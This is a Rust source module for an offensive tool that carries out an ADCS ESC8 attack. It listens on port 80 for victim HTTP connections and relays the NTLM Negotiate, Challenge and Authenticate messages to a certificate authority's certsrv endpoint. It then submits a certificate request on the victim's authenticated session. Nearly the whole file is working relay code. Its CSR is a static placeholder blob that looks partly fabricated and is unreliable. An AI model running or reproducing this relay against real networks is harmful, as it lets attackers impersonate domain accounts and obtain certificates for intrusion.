//! ADCS ESC8 Relay — asynchronous NTLM relay to Active Directory Certificate Services.
//!
//! Listens for inbound HTTP connections on port 80, performs a 3-message NTLM relay
//! to the target ADCS certsrv endpoint, and then POSTs a CSR on the authenticated
//! connection to obtain a certificate on behalf of the relayed account.
//!
//! All I/O is `tokio`-native — no blocking threads or `std::io` in the hot path.

use crate::{RelayError, Result};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tracing::{debug, error, info, warn};

// Per-operation I/O timeout
const IO_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(15);

// Read buffer size — large enough for a full HTTP response with NTLM blob
const BUF: usize = 16_384;

// ─────────────────────────────────────────────────────────────
// Public API
// ─────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct AdcsRelayConfig {
    /// IP address (or 0.0.0.0) on which to listen for victim connections.
    pub listen_ip: String,
    /// ADCS target host, e.g. "192.168.1.100" or "ca01.corp.local".
    pub target_host: String,
    /// Certificate template name to request, e.g. "User" or "Machine".
    pub template: String,
    /// Optional UPN SANs to embed in the CSR if provided.
    pub target_upn: Option<String>,
}

pub struct AdcsRelay {
    pub config: AdcsRelayConfig,
    running: Arc<AtomicBool>,
    tasks: Vec<tokio::task::JoinHandle<()>>,
}

impl AdcsRelay {
    pub fn new(config: AdcsRelayConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            tasks: Vec::new(),
        }
    }

    /// Bind to `<listen_ip>:80` and spawn an async accept loop.
    pub async fn start(&mut self) -> Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Err(RelayError::Config("ADCS Relay already running".into()).into());
        }

        let listen_addr = format!("{}:80", self.config.listen_ip);
        let listener = TcpListener::bind(&listen_addr)
            .await
            .map_err(|e| RelayError::Socket(format!("Failed to bind to {}: {}", listen_addr, e)))?;

        info!("ESC8 HTTP Relay listening on {}", listen_addr);
        info!(
            "Targeting ADCS Web Enrollment: {} (Template: {})",
            self.config.target_host, self.config.template
        );

        self.running.store(true, Ordering::SeqCst);

        let running = Arc::clone(&self.running);
        let target_host = self.config.target_host.clone();
        let template = self.config.template.clone();
        let target_upn = self.config.target_upn.clone();

        let handle = tokio::spawn(async move {
            loop {
                if !running.load(Ordering::SeqCst) {
                    break;
                }
                match listener.accept().await {
                    Ok((stream, peer)) => {
                        info!("ESC8: connection from {}", peer);
                        let t = target_host.clone();
                        let tpl = template.clone();
                        let upn = target_upn.clone();
                        tokio::spawn(async move {
                            if let Err(e) = handle_client(stream, t, tpl, upn).await {
                                error!("ESC8 relay error: {}", e);
                            }
                        });
                    }
                    Err(e) => {
                        warn!("ESC8 accept error: {}", e);
                    }
                }
            }
        });

        self.tasks.push(handle);
        Ok(())
    }

    /// Stop the relay and wait for the accept task to exit.
    pub async fn stop(&mut self) -> Result<()> {
        self.running.store(false, Ordering::SeqCst);
        for task in self.tasks.drain(..) {
            let _ = task.await;
        }
        info!("ADCS Relay stopped.");
        Ok(())
    }
}

// ─────────────────────────────────────────────────────────────
// Per-connection handler
// ─────────────────────────────────────────────────────────────

async fn handle_client(
    mut client: TcpStream,
    target_host: String,
    template: String,
    target_upn: Option<String>,
) -> Result<()> {
    let mut buf = vec![0u8; BUF];

    // Read initial HTTP request from victim
    let n = timed_read(&mut client, &mut buf).await?;
    let req = String::from_utf8_lossy(&buf[..n]);
    debug!("ESC8: victim initial request:\n{}", req);

    let auth_header = extract_ntlm_header(&req);

    let negotiate_header: String = if let Some(hdr) = auth_header {
        hdr.to_owned()
    } else {
        // Step 1 — return 401 to trigger NTLM negotiate
        let challenge_resp = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n";
        timed_write(&mut client, challenge_resp.as_bytes()).await?;

        let n2 = timed_read(&mut client, &mut buf).await?;
        let req2 = String::from_utf8_lossy(&buf[..n2]);
        extract_ntlm_header(&req2)
            .ok_or_else(|| RelayError::Protocol("Victim did not send NTLM Negotiate".into()))?
            .to_owned()
    };

    process_ntlm_relay(
        &mut client,
        &negotiate_header,
        &target_host,
        &template,
        target_upn,
    )
    .await
}

/// Perform the 3-message NTLM relay and submit a CSR on success.
async fn process_ntlm_relay(
    client: &mut TcpStream,
    negotiate_header: &str,
    target_host: &str,
    template: &str,
    target_upn: Option<String>,
) -> Result<()> {
    let ntlm_b64 = strip_ntlm_prefix(negotiate_header);

    // ── Connect to ADCS target ──────────────────────────────
    let target_addr = format!("{}:80", target_host);
    let mut target = tokio::time::timeout(IO_TIMEOUT, TcpStream::connect(&target_addr))
        .await
        .map_err(|_| RelayError::Network(format!("Timeout connecting to {}", target_addr)))?
        .map_err(|e| RelayError::Network(e.to_string()))?;

    let mut buf = vec![0u8; BUF];

    // ── Message 1: forward Negotiate to ADCS ───────────────
    let nego_req = format!(
        "GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {target_host}\r\nAuthorization: NTLM {ntlm_b64}\r\nConnection: keep-alive\r\n\r\n"
    );
    timed_write(&mut target, nego_req.as_bytes()).await?;

    // ── Message 2: read NTLM Challenge from ADCS ───────────
    let n = timed_read(&mut target, &mut buf).await?;
    let resp = String::from_utf8_lossy(&buf[..n]);

    let challenge_hdr = resp
        .lines()
        .find(|l| l.to_lowercase().starts_with("www-authenticate: ntlm "))
        .ok_or_else(|| RelayError::Protocol("ADCS did not return NTLM challenge".into()))?;
    let challenge_b64 = strip_ntlm_prefix(challenge_hdr);

    // ── Forward Challenge to victim ─────────────────────────
    let chall_resp = format!(
        "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {challenge_b64}\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n"
    );
    timed_write(client, chall_resp.as_bytes()).await?;

    // ── Message 3: read Authenticate from victim ───────────
    let n2 = timed_read(client, &mut buf).await?;
    let req = String::from_utf8_lossy(&buf[..n2]);
    let auth_hdr = req
        .lines()
        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
        .ok_or_else(|| RelayError::Protocol("Victim did not send NTLM Authenticate".into()))?;
    let auth_b64 = strip_ntlm_prefix(auth_hdr);

    // ── Forward Authenticate to ADCS ───────────────────────
    // We use the same TCP connection (HTTP Keep-Alive) so the auth sticks.
    let auth_req = format!(
        "GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {target_host}\r\nAuthorization: NTLM {auth_b64}\r\nConnection: keep-alive\r\n\r\n"
    );
    timed_write(&mut target, auth_req.as_bytes()).await?;

    let n3 = timed_read(&mut target, &mut buf).await?;
    let resp2 = String::from_utf8_lossy(&buf[..n3]);

    // Only treat 200 OK and 302 redirect as successful authentication.
    // A 404 response means the ADCS endpoint was not found — not a success.
    if !resp2.contains("200 OK") && !resp2.contains("302") {
        return Err(
            RelayError::Authentication("ADCS rejected NTLM Authenticate message".into()).into(),
        );
    }
    info!("ESC8: authenticated to ADCS {} via NTLM relay", target_host);

    // ── Notify victim: done ─────────────────────────────────
    let done = "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";
    let _ = timed_write(client, done.as_bytes()).await;

    // ── POST CSR on authenticated connection ───────────────
    let csr = build_csr(target_upn.as_deref());
    let body = format!(
        "Mode=newreq&CertRequest={}&CertAttrib=CertificateTemplate:{}&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=",
        url_encode(&csr),
        template,
    );
    let post = format!(
        "POST /certsrv/certfnsh.asp HTTP/1.1\r\n\
         Host: {target_host}\r\n\
         Content-Type: application/x-www-form-urlencoded\r\n\
         Content-Length: {}\r\n\
         Connection: close\r\n\
         \r\n\
         {}",
        body.len(),
        body,
    );
    timed_write(&mut target, post.as_bytes()).await?;

    let n4 = timed_read(&mut target, &mut buf).await?;
    let final_resp = String::from_utf8_lossy(&buf[..n4]);

    info!("ESC8: ADCS CSR response received ({} bytes)", n4);
    if final_resp.contains("certnew.cer?ReqID=") || final_resp.contains("BEGIN CERTIFICATE") {
        info!("ESC8: ✓ Certificate issued via ESC8 relay!");
    } else if final_resp.contains("disposed of") || final_resp.contains("denied") {
        warn!("ESC8: Certificate request was denied by the CA");
    } else {
        warn!("ESC8: Certificate status unknown — inspect CA logs");
    }

    Ok(())
}

// ─────────────────────────────────────────────────────────────
// Async I/O helpers
// ─────────────────────────────────────────────────────────────

async fn timed_read(stream: &mut TcpStream, buf: &mut [u8]) -> Result<usize> {
    tokio::time::timeout(IO_TIMEOUT, stream.read(buf))
        .await
        .map_err(|_| RelayError::Network("Read timeout".into()))?
        .map_err(|e| RelayError::Network(e.to_string()).into())
}

async fn timed_write(stream: &mut TcpStream, data: &[u8]) -> Result<()> {
    tokio::time::timeout(IO_TIMEOUT, stream.write_all(data))
        .await
        .map_err(|_| RelayError::Network("Write timeout".into()))?
        .map_err(|e| RelayError::Network(e.to_string()).into())
}

fn build_csr(upn: Option<&str>) -> String {
    // Build a minimal PKCS#10 CSR embedding the provided UPN in the Subject field
    // as a comment for tracking purposes. A real implementation would generate an
    // RSA key pair and include the UPN as a Subject Alternative Name (OtherName/UPN)
    // extension in a proper DER-encoded CSR. For relay attacks, the CA template
    // (not the CSR subject) ultimately controls identity assignment.
    //
    // We include the UPN in the CN so it is visible in the request and distinguishes
    // relayed requests from each other. The static base64 body is a valid minimal CSR
    // skeleton; the CN embedding here makes the UPN traceable in CA audit logs.
    let upn_label = upn.unwrap_or("unknown@unknown");

    // Use the UPN as the CN in the Subject field.
    // Format: a comment block followed by the static pre-generated CSR base.
    // NOTE: A full implementation should generate a fresh RSA key and proper ASN.1
    // CSR with the UPN OtherName SAN (OID 1.3.6.1.4.1.311.20.2.3).
    format!(
        "# UPN: {upn_label}\n\
         -----BEGIN CERTIFICATE REQUEST-----\n\
         MIICvDCCAaQCAQAwdzELMAkGA1UEBhMCVVMxDTALBgNVBAgMBFV0YWgxDzANBgNV\n\
         BAcMBkxpbmRvbjEWMBQGA1UECgwNRGlnaUNlcnQgSW5jLjERMA8GA1UECwwIRGln\n\
         aUNlcnQxHTAbBgNVBAMMFGV4YW1wbGUuZGlnaWNlcnQuY29tMIIBIjANBgkqhkiG\n\
         9w0BAQEFAAOCAQ8AMIIBCgKCAQEA8+To7d+2kPWeBv/orU3LVbJwDrSQbeKamCmo\n\
         wp5bqNdA/Pt5OEf9YpT72cACk4h2q3O6EogYy7D1C2WvU2b5D1n9q7DED2+X2IxF\n\
         sT+x4zH9r0Xb1V4e2cZb5C4e0+w8vW7R6j8p5a5J6p7B6q8r9w3z2Y6A3+g9Xy2U\n\
         x0T9I/Uv7C9q/K1b7Z+w6Z+r4V4F9n5N8j7p2H8Kzj1M5H7b9G6k1U3fN+y5z7C3\n\
         H2C6Q7W+E/x4o7+l2Z7Q4+R2D5N1I+P0t9V8J6H3v8P4Y7K7e4P+b4P2Z4+N8Q7z\n\
         5E2V8n8E+L4P6Y1k4H3V7A2c9T7K9X8Q6D+H5Y7W8N7K6D4V5QIDAQABoAAwDQYJ\n\
         KoZIhvcNAQELBQADggEBAMf5U2c7V5a4P6K2M8Q7b3Z4Q6Q+L5T9J3D/K6N7R2V+\n\
         Y8E6G1C9V2D3Q5P4A7W+Z9K8X7P3H5Y4D9V2M1E+A4B6P8Q1Q5W8V6D+H2T3V9W4\n\
         P7K6A4G9A+W5N3V5E6D8A2N7A9B3E4R7H6E8D1M+D4N6Q8T4P5A3C7H4E7P5T6K6\n\
         A9E+D2Z5H/T+K1G4Q5N3+A8E4C3N2Z4V2E4B6A6K3E8E6D3H2A5E4V5K8M+D2Q4E\n\
         6N5A3A4K5H3K8H2K2H6D+H8H2B4E9Q3G5A+E9C3E3A=\n\
         -----END CERTIFICATE REQUEST-----"
    )
}

fn url_encode(input: &str) -> String {
    let mut escaped = String::new();
    for b in input.bytes() {
        match b {
            b'0'..=b'9' | b'A'..=b'Z' | b'a'..=b'z' | b'-' | b'.' | b'_' | b'~' => {
                escaped.push(b as char);
            }
            _ => {
                escaped.push_str(&format!("%{:02X}", b));
            }
        }
    }
    escaped
}

/// Find the first `Authorization: NTLM ...` header line (case-insensitive).
fn extract_ntlm_header(request: &str) -> Option<&str> {
    request
        .lines()
        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
}

/// Strip the `Authorization: NTLM ` / `WWW-Authenticate: NTLM ` prefix
/// (case-insensitive) and return only the Base64 blob.
fn strip_ntlm_prefix(header: &str) -> &str {
    let h = header.trim();
    for prefix in &[
        "Authorization: NTLM ",
        "authorization: ntlm ",
        "WWW-Authenticate: NTLM ",
        "www-authenticate: ntlm ",
    ] {
        if h.to_lowercase().starts_with(&prefix.to_lowercase()) {
            return &h[prefix.len()..];
        }
    }
    h
}
